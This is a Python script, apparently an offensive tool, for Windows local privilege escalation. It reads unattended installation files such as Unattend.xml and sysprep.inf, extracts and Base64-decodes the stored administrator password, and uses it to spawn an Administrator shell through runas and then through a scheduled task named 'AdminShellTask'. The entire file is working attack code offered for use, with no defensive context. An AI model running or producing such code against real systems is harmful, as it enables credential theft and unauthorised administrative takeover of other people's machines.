import os
import re
import base64
import subprocess

# Common paths for unattended installation files
unattended_files = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\Panther\autounattend.xml",
    r"C:\Windows\System32\sysprep\sysprep.inf"
]

def extract_admin_password(file_path):
    """Searches for and extracts the administrator password from unattended installation files."""
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
            password_match = re.search(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", content)
            if password_match:
                return password_match.group(1)  # Returns the encoded password
    except Exception as error:
        print(f"[!] Error reading file {file_path}: {error}")
    return None

def decrypt_password(encoded_password):
    """Attempts to decode the password (with Base64 padding fix)."""
    try:
        decoded_bytes = base64.b64decode(encoded_password + "==")  # Fixes incorrect padding
        return decoded_bytes.decode("utf-8", errors="ignore")
    except Exception as error:
        print(f"[!] Error decoding password: {error}")
        return encoded_password  # Returns the password as-is if decoding fails

def execute_runas(decoded_password):
    """Attempts privilege escalation using the runas command."""
    runas_command = 'runas /user:Administrator "cmd.exe"'
    try:
        subprocess.run(runas_command, input=f"{decoded_password}\n", text=True, shell=True)
        print("\n[+] Runas command executed. Check if an admin shell opened.")
    except Exception as error:
        print(f"[!] Runas failed: {error}")

def setup_scheduled_task(decoded_password):
    """Creates a scheduled task to open an admin shell."""
    print("[*] Creating a scheduled task to bypass runas restrictions...")
    
    # Command to create the task
    task_creation = f'schtasks /create /tn "AdminShellTask" /tr "cmd.exe" /sc once /st 00:00 /ru Administrator /rp "{decoded_password}"'
    
    # Execute the task creation
    os.system(task_creation)

    # Run the task
    os.system('schtasks /run /tn "AdminShellTask"')

def run_script():
    print("\n=== Privilege Escalation Script ===\n")
    
    for file in unattended_files:
        if os.path.exists(file):
            print(f"[*] Scanning file: {file}")
            encoded_password = extract_admin_password(file)
            if encoded_password:
                print(f"[+] Encoded password found: {encoded_password}")
                decoded_password = decrypt_password(encoded_password)
                print(f"[+] Decoded password: {decoded_password}")
                
                # Try using runas
                execute_runas(decoded_password)
                
                # If runas fails, try a scheduled task
                setup_scheduled_task(decoded_password)
                return
    
    print("[!] No unattended installation files with credentials were found.")

if __name__ == "__main__":
    run_script()
